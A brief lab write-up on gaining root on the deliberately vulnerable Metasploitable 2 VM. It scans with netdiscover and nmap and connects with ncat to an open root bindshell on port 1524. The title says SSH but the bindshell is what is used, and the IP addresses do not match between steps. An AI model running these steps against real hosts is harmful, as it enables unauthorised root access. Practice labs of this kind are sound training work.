# Metasploitable 2 SSH exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - **SSH**.



 > The target of this lab is use vulnerablitity in SSH service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts

 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
1524/tcp open  bindshell   Metasploitable root shell
.
.
.
```

Searching on Internet we found:

> Port 1524 is commonly associated with a vulnerability called a bindshell.  A bindshell is a malicious program that listens on a specific port, waiting for a connection.  Once a connection is made, the attacker can use it to execute commands on the target system.  This can be very dangerous, as it can give the attacker complete control over the system.


Ncat can be used to connect to a bindshell on port 1524.  This would allow an attacker to send commands to the target system.


## Exploitation:

Use command: `ncat 192.168.43.95 1524`

```
root@metasploitable:/# uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
root@metasploitable:/# whoami
root
```

Just a simple command helps us getting into machine with root access.
